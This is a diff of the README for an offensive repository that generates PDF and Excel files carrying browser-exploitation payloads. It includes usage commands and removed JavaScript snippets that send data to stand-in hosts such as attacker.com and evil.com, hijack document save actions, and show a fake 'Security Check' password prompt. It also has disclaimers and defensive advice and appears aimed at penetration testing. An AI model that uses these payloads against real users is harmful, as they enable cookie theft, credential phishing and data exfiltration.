@@ -1,354 +1,189 @@
-# Excel Browser Rendering XSS Tool v3.0 - Advanced Excel Browser Exploitation
+# XSS-PDF Repository - PDF & Excel Browser Exploitation Tools
 
-## 🚀 100+ Excel Browser Rendering Payloads
+## 🚀 Two Complete Security Testing Tools
 
-A research-grade tool for generating Excel files with sophisticated payloads designed to exploit Excel files when rendered in web browsers. Features 100+ distinct payloads targeting Chrome Excel rendering, Firefox Excel handling, Safari Excel integration, Edge Excel processing, Office 365 Web Excel, and Google Sheets Excel import functionality.
+This repository contains two separate, comprehensive security testing tools for browser-based exploitation:
+
+1. **PDF-XSS Tool**: Advanced PDF sandbox escape and browser exploitation framework
+2. **Excel-XSS Tool**: Excel browser rendering exploitation with 60+ payloads
 
 ## 📁 Project Structure
 
 ```
 XSS-PDF/
-├── PDF/                                    # Legacy PDF generation tools
-│   ├── script.py                           # Original PDF Generator
-│   ├── Another-Script.py                   # Browser-specific PDF generator  
-│   ├── Files/                              # Generated PDF files output directory
-│   └── IMPROVEMENTS.md                     # Feature improvements documentation
-├── export_to_excel.py                      # NEW: Excel browser payload exporter
-├── merge_json_payloads.py                  # JSON payload database merger
-├── payload_database.json                   # Excel browser payload database (45+ payloads)
-├── excel_browser_payload_database.json     # Comprehensive Excel browser database
-├── requirements.txt                        # Python dependencies for Excel export
-├── README.md                               # This file
-└── Script-1-Readme.md                     # Additional documentation
+├── PDF-XSS/                               # Complete PDF-XSS Tool
+│   ├── script.py                          # Main PDF generator script
+│   ├── Another-Script.py                  # Alternative browser-specific PDF generator  
+│   ├── pdf_payloads.json                 # Consolidated PDF payload database (20 payloads)
+│   ├── IMPROVEMENTS.md                    # Feature improvements documentation
+│   ├── README.md                          # PDF-XSS tool documentation
+│   ├── requirements.txt                   # PDF tool dependencies (standard library only)
+│   └── merge_json_payloads.py            # Payload merger utility
+├── Excel-XSS/                            # Complete Excel-XSS Tool
+│   ├── export_to_excel.py                # Excel browser payload exporter
+│   ├── excel_payloads.json              # Consolidated Excel payload database (60 payloads)
+│   ├── README.md                         # Excel-XSS tool documentation
+│   ├── requirements.txt                  # Excel tool dependencies (pandas, openpyxl)
+│   └── merge_json_payloads.py           # Payload merger utility
+├── README.md                             # This file - Repository overview
+└── Script-1-Readme.md                   # Additional documentation
 ```
 
 ## ⚠️ Legal Disclaimer
 
-This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.
+These tools are designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.
 
-## 🎯 Excel Browser Rendering Research Database
+## 🎯 Tool Overview
 
-### Browser-Specific Excel Targeting
-- **Chrome Excel Rendering**: Google Drive integration, Chromium-based Excel viewer exploitation
-- **Firefox Excel Handling**: Plugin-based Excel rendering, Gecko engine integration abuse
-- **Safari Excel Integration**: macOS Excel rendering, WebKit engine exploitation
-- **Edge Excel Processing**: Windows Excel integration, WebView2 and ActiveX legacy exploitation
-- **Office 365 Web Excel**: Browser-based Excel application, SharePoint integration abuse
-- **Google Sheets Excel Import**: Excel file processing and conversion vulnerabilities
+### PDF-XSS Tool
+**Advanced PDF Sandbox Escape and Browser Exploitation Framework**
+- **20+ sophisticated PDF payloads** targeting browser PDF renderers
+- **Multi-browser support**: Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, Edge
+- **Sandbox escape techniques**: DOM access, file system access, command execution, network exfiltration
+- **No dependencies**: Uses only Python standard library
+- **Research-based**: Built on 50+ CVE references and security conference research
 
-### Comprehensive Research Foundation
-- **100+ CVE References** for Excel browser rendering vulnerabilities
-- **Security Conference Research** (BlackHat, DEF CON, BSides presentations)
-- **GitHub Security Research** repositories and POC exploits
-- **Bug Bounty Platform Reports** (HackerOne, Bugcrowd disclosures)
-- **Darknet Forum Analysis** for advanced Excel exploitation techniques
-- **Academic Security Papers** on Excel browser security vulnerabilities
+### Excel-XSS Tool  
+**Excel Browser Rendering Exploitation Framework**
+- **60+ Excel browser payloads** targeting Excel files in web browsers
+- **Multi-format support**: .xls, .xlsx, .xlsm, .xlsb format exploitation
+- **Browser compatibility**: Chrome, Firefox, Safari, Edge, Office 365 Web, Google Sheets
+- **Advanced features**: Formula injection, macro execution, XXE exploitation, CSV injection
+- **Professional export**: Comprehensive Excel reports with research documentation
 
-## 🔒 Excel Browser Exploitation Features
+## 🚀 Key Features
 
-### Advanced Excel File Formats
-- **Legacy .xls Format**: Reduced security restrictions, ActiveX control support
-- **Modern .xlsx Format**: XML-based structure with XXE exploitation vectors
-- **Macro-enabled .xlsm**: VBA macro execution in browser context
-- **Binary .xlsb Format**: Performance optimized with detection evasion capabilities
-### Excel Browser Payload Categories
-- **Formula Injection**: Malicious Excel formulas executed in browser context (DDE, RTD functions)
-- **Macro Execution**: VBA macro payloads for browser-rendered Excel files
-- **External Data Connections**: HTTP/UNC path abuse for data exfiltration and credential harvesting
-- **XML External Entity (XXE)**: Excel XML format exploitation for file disclosure
-- **CSV Injection**: CSV-based formula injection in browser Excel viewers
-- **Browser DOM Access**: Excel-to-browser DOM manipulation and cross-frame access
+### PDF-XSS Tool Features
+- **PDF Sandbox Escape**: Advanced techniques for breaking out of PDF sandboxes
+- **Browser-Specific Targeting**: Tailored payloads for different PDF rendering engines
+- **Action-Based Persistence**: PDF action hijacking for persistent attacks
+- **Data Exfiltration**: Form submission and URL launching escape methods
+- **Dialog Exploitation**: Credential harvesting via PDF dialogs
 
-## 🚀 Features
+### Excel-XSS Tool Features
+- **Legacy Format Focus**: Targets older Excel formats (.xls) with reduced security restrictions
+- **Browser Integration Abuse**: Exploits Excel rendering in web browsers
+- **Advanced Research Base**: 100+ CVE references, security conferences, GitHub research
+- **Multi-Sheet Analysis**: Professional Excel export with comprehensive documentation
+- **Cross-Platform Testing**: Works across different operating systems and browsers
 
-- **100+ Excel Browser Payloads**: Comprehensive collection targeting Excel browser rendering
-- **Legacy Format Support**: Targets older Excel formats (.xls) with reduced security restrictions
-- **Cross-Browser Compatibility**: Works across Chrome, Firefox, Safari, Edge, Office 365, Google Sheets
-- **Advanced Research Base**: 100+ CVE references, security conferences, GitHub research, darknet analysis
-- **Excel Format Diversity**: .xls, .xlsx, .xlsm, .xlsb format exploitation techniques
-- **Professional Excel Export**: Multi-sheet analysis with comprehensive research documentation
-- **CVE Reference Integration**: Each payload linked to relevant Excel security vulnerabilities
+## 🛠️ Installation & Quick Start
 
-## 📊 Excel Browser Payload Export (NEW)
-
-### Overview
-The Excel browser payload export provides comprehensive security research data focused on Excel files rendered in web browsers, targeting legacy Excel formats with reduced security restrictions.
-
-### Features
-- **Excel Browser Focus**: Payloads targeting Excel files opened in web browsers
-- **Legacy Format Targeting**: Emphasis on older Excel standards (.xls) with lower security restrictions
-- **Comprehensive Research**: GitHub, CVE database, darknet forums, security conferences analysis
-- **Multiple Analysis Sheets**: Browser-specific, Excel format analysis, CVE references, research summary
-- **Professional Formatting**: Tables, conditional formatting, and organized layouts for security research
-
-### Usage
+### PDF-XSS Tool
 ```bash
-# Install dependencies for Excel export
+# Navigate to PDF-XSS tool
+cd PDF-XSS
+
+# No dependencies required - uses Python standard library only
+# Generate basic PDF files
+python3 script.py -o pdf
+
+# Generate all PDF XSS payload types with exfiltration URL
+python3 script.py -t all -u https://webhook.site/your-id
+
+# Generate browser-specific payloads
+python3 script.py -b chrome -u http://attacker.com/collect
+```
+
+### Excel-XSS Tool
+```bash
+# Navigate to Excel-XSS tool
+cd Excel-XSS
+
+# Install dependencies
 pip install -r requirements.txt
 
 # Export Excel browser payload database to Excel format
 python3 export_to_excel.py
 
-# Generated file: excel_browser_payload_database_YYYYMMDD_HHMMSS.xlsx
+# View payload metadata
+cat excel_payloads.json | head -20
 ```
 
-### Excel Sheet Contents
-- **All Excel Browser Payloads**: Complete database with Excel browser exploitation payloads
-- **Browser Sheets**: Chrome, Firefox, Safari, Edge, Office 365 Web, Google Sheets specific payloads
-- **Excel Category Analysis**: Breakdown by Excel attack category (formula injection, macro execution, etc.)
-- **Excel CVE References**: Excel browser security vulnerability references and affected components
-- **Excel Research Summary**: Methodology, sources, and comprehensive research foundation
+## 📖 Documentation
 
-## 📋 Usage Examples
+Each tool includes comprehensive documentation:
 
-### Excel Browser Payload Generation
+- **PDF-XSS/README.md**: Complete PDF-XSS tool documentation with usage examples, command line flags, and security testing methodology
+- **Excel-XSS/README.md**: Complete Excel-XSS tool documentation with browser compatibility, payload categories, and testing procedures
+
+## 🎯 Usage Examples
+
+### PDF-XSS Tool Examples
 ```bash
-# Export comprehensive Excel browser payload database
-python3 export_to_excel.py
-```
+cd PDF-XSS
 
-### Legacy PDF Usage (Maintained)
-```bash
-# Navigate to the PDF directory
-cd PDF
+# Basic PDF generation
+python3 script.py --help
+python3 script.py -t alert
 
-# Generate Chrome-specific payloads
-python3 script.py -b chrome -u http://attacker.com/collect
-
-# Generate all browser payloads with data exfiltration
-python3 script.py -b all -u https://webhook.site/xyz
-
-# Target specific payload category
+# Advanced sandbox escape testing
+python3 script.py -t cookie -u http://attacker.com/collect
 python3 script.py -b firefox --category file_system -u http://evil.com
 
-# Limit number of payloads generated
-python3 script.py -b adobe --count 50 -u http://collector.com
-```
-
-### Advanced Usage
-```bash
-# Navigate to the PDF directory first
-cd PDF
-
-# Export payload database as JSON
-python3 script.py -b all --output-json
-
-# Verbose output with payload details
-python3 script.py -b safari -u http://test.com -v
-
-# List research sources and CVE references
-python3 script.py --list-research
-
-# Filter by specific categories
-python3 script.py -b chrome --category command_execution -u http://log.site
-
-# Use the alternative script for browser-specific PDFs
+# Alternative script usage
 python3 Another-Script.py -b chrome -u http://test.com
 ```
 
-## 🎯 Browser Targets
-
-| Browser | PDF Library | Payload Count | Focus Areas |
-|---------|------------|---------------|-------------|
-| Chrome | PDFium | 200+ | V8 engine exploitation, IPC abuse, process injection |
-| Firefox | PDF.js | 200+ | CSP bypass, SpiderMonkey exploitation, Content Security Policy evasion |
-| Safari | PDFKit | 200+ | macOS integration, WebKit messageHandlers, Objective-C bridge abuse |
-| Adobe | Acrobat/Reader | 250+ | Full JavaScript API, privilege escalation, file system access |
-| Edge | Edge PDF | 150+ | Windows integration, WebView exploitation, registry manipulation |
-
-## 📊 Payload Categories
-
-| Category | Description | Example Techniques |
-|----------|-------------|-------------------|
-| `dom_access` | Browser DOM manipulation from PDF context | parent.window.location, postMessage abuse |
-| `file_system` | Local file system access and directory traversal | file:// URI manipulation, browseForDoc() |
-| `command_execution` | System command execution and process spawning | Protocol handler abuse, ms-msdt exploitation |
-| `sandbox_escape` | PDF sandbox restriction bypasses | IPC manipulation, memory corruption |
-| `network_exfiltration` | Data exfiltration and covert channels | Form submission, XMLHttpRequest alternatives |
-
-## 🛠️ Installation & Requirements
-
-### Requirements
-- Python 3.x
-- For Excel export: pandas, openpyxl (install via requirements.txt)
-
-### Installation
+### Excel-XSS Tool Examples  
 ```bash
-git clone https://github.com/SNGWN/XSS-PDF.git
-cd XSS-PDF
+cd Excel-XSS
 
-# Install dependencies for Excel export functionality (optional)
-pip install -r requirements.txt
+# Generate comprehensive Excel report
+python3 export_to_excel.py
 
-# Navigate to PDF folder for main scripts
-cd PDF
+# Extract specific payload types
+cat excel_payloads.json | jq '.payloads[] | select(.browser=="chrome")'
+
+# Count payloads by category
+cat excel_payloads.json | jq '.payloads | group_by(.category) | map({category: .[0].category, count: length})'
 ```
 
-## 📖 Usage
+## 🚨 Security Testing Methodology
 
-### Basic Commands
-
-```bash
-# Navigate to the PDF directory
-cd PDF
-
-# Show help and available options
-python3 script.py --help
-
-# List all available XSS payload types
-python3 script.py --list-types
-
-# Generate basic PDF files (backward compatibility)
-python3 script.py -o pdf
-
-# Generate specific XSS payload type
-python3 script.py -t alert
-
-# Generate all XSS payload types
-python3 script.py -t all
-
-# Generate HTML XSS test file
-python3 script.py -o html
-```
-
-### Advanced PDF Sandbox Escape Usage
-
-```bash
-# Navigate to PDF directory first
-cd PDF
-
-# PDF data exfiltration via form submission escape
-python3 script.py -t cookie -u http://attacker.com/collect
-
-# PDF action-based sandbox escape
-python3 script.py -t action -u http://collaborator.burpsuite.com
-
-# PDF dialog manipulation for credential harvesting
-python3 script.py -t dialog -u http://logger.example.com
-
-# PDF file system escape attempts
-python3 script.py -t file
-
-# Generate all PDF sandbox escape types
-python3 script.py -t all -u http://collaborator.burpsuite.com
-
-# PDF network escape via URL launching
-python3 script.py -t network -u https://webhook.site/unique-id
-```
-
-## 🏁 Command Line Flags
-
-| Flag | Long Form | Description | Example |
-|------|-----------|-------------|---------|
-| `-h` | `--help` | Show help message | `python3 script.py --help` |
-| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
-| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
-| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
-| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
-| | `--list-types` | List available payload types | `--list-types` |
-
-## 📁 Output Files
-
-### PDF Files
-**All generated PDF files are automatically stored in a `Files/` directory.**
-
-The tool creates the `Files` directory automatically if it doesn't exist. Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`
-
-Examples:
-- `Files/xss_alert_20240115_143022.pdf`
-- `Files/xss_cookie_20240115_143025.pdf`
-- `Files/xss_custom_20240115_143030.pdf`
-
-### HTML Files
-Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`
-
-Example:
-- `xss_test_20240115_143035.html`
-
-## 🎯 PDF Sandbox Escape Examples
-
-### PDF Form Submission Escape
-```javascript
-// PDF-specific data exfiltration
-this.submitForm({
-    cURL: "http://attacker.com/collect",
-    cSubmitAs: "HTML",
-    cCharset: "utf-8"
-});
-```
-
-### PDF URL Launching Escape
-```javascript
-// Escape sandbox via URL launching
-app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
-```
-
-### PDF Action Hijacking
-```javascript
-// Hijack document actions for persistent escape
-this.setAction("WillSave", 
-    "app.launchURL('http://attacker.com/save-intercept', true);"
-);
-```
-
-### PDF Dialog Exploitation
-```javascript
-// Credential harvesting via PDF dialogs
-var creds = app.response({
-    cQuestion: "Enter your credentials:",
-    cTitle: "Security Check",
-    bPassword: true
-});
-```
-
-## 🔍 PDF Security Testing Methodology
-
-1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
-2. **Upload/Embed Testing**: Test file upload functionality on target applications
+### PDF-XSS Security Testing
+1. **Generate PDF Test Files**: Create PDFs with various sandbox escape payloads
+2. **Upload/Embed Testing**: Test file upload functionality on target applications  
 3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
 4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
 5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
-6. **Action Persistence Testing**: Test if PDF actions persist across viewer sessions
-7. **Dialog Security Testing**: Test credential harvesting via PDF dialog manipulation
 
-## 🛡️ PDF-Specific Defensive Measures
+### Excel-XSS Security Testing
+1. **Generate Excel Test Files**: Create Excel files with browser exploitation payloads
+2. **Upload/Share Testing**: Test file upload and sharing mechanisms
+3. **Browser Excel Viewer Analysis**: Test different browser Excel viewers and online services
+4. **Formula Injection Testing**: Test malicious formula execution in browser context
+5. **Cross-Browser Testing**: Verify payload effectiveness across different browsers
 
-To protect against PDF sandbox escape attacks:
+## 🛡️ Defensive Measures
 
+### PDF-XSS Protection
 - **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
 - **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
 - **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
 - **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
-- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests
-- **PDF Content Analysis**: Scan uploaded PDFs for JavaScript and suspicious structures
-- **User Education**: Train users on PDF security risks and safe viewing practices
 
-## 🚨 Security Considerations
+### Excel-XSS Protection  
+- **Disable External Data Connections**: Block HTTP/UNC path connections from Excel files
+- **Formula Execution Restrictions**: Disable or restrict formula execution in browser Excel viewers
+- **Macro Security**: Implement strict macro execution policies for browser-rendered Excel files
+- **File Upload Validation**: Scan uploaded Excel files for suspicious formulas and external connections
 
-- Always obtain proper authorization before testing
-- Use in controlled environments only
-- Be aware of legal implications
-- Respect responsible disclosure practices
-- Monitor and log all testing activities
+## 📈 Research Foundation
 
-## 📈 Changelog
+Both tools are built on extensive security research:
 
-### Version 3.0 (Current) - PDF Sandbox Escape Enhancement
-- **Complete rewrite for PDF sandbox context**
-- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
-- **12 sophisticated sandbox escape techniques**
-- **Enhanced PDF structure**: More complex PDF objects for better escape potential
-- **Action-based persistence**: PDF action hijacking for persistent attacks
-- **Dialog exploitation**: Credential harvesting via PDF dialogs
-- **Form submission escapes**: Data exfiltration via PDF form submission
-- **URL launching escapes**: Sandbox escape via app.launchURL()
-- **File system escape attempts**: PDF-specific file access methods
-- **Comprehensive error handling for PDF context**
+### PDF-XSS Research Base
+- **50+ CVE References** across all PDF rendering libraries
+- **Academic Papers** on PDF security and sandbox escapes
+- **Bug Bounty Reports** from major platforms
+- **Security Conference** presentations and whitepapers
 
-### Version 1.0 (Legacy)
-- Basic PDF generation with simple XSS payloads
-- Limited to 2-3 payload types
-- Basic URL and custom script support
+### Excel-XSS Research Base
+- **100+ CVE References** for Excel browser rendering vulnerabilities
+- **Security Conference Research** (BlackHat, DEF CON, BSides presentations)
+- **GitHub Security Research** repositories and POC exploits
+- **Bug Bounty Platform Reports** (HackerOne, Bugcrowd disclosures)
 
 ## 🤝 Contributing
 
@@ -360,16 +195,24 @@ Contributions are welcome! Please:
 4. Follow existing code style
 5. Submit a pull request with detailed description
 
-## 📄 License
-
-This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.
+When contributing to either tool, please maintain the separation between PDF-XSS and Excel-XSS functionality.
 
 ## 🔗 Resources
 
+### PDF Security Resources
 - [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
 - [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
 - [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)
 
+### Excel Security Resources
+- [OWASP Testing Guide - File Upload Testing](https://owasp.org/www-project-web-security-testing-guide/)
+- [Microsoft Excel Security](https://docs.microsoft.com/en-us/deployoffice/security/)
+- [Excel Formula Injection](https://owasp.org/www-community/attacks/CSV_Injection)
+
+## 📄 License
+
+This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.
+
 ---
 
-**Remember**: This tool is for authorized security testing only. Always obtain proper permission before testing any systems.
+**Remember**: These tools are for authorized security testing only. Always obtain proper permission before testing any systems.
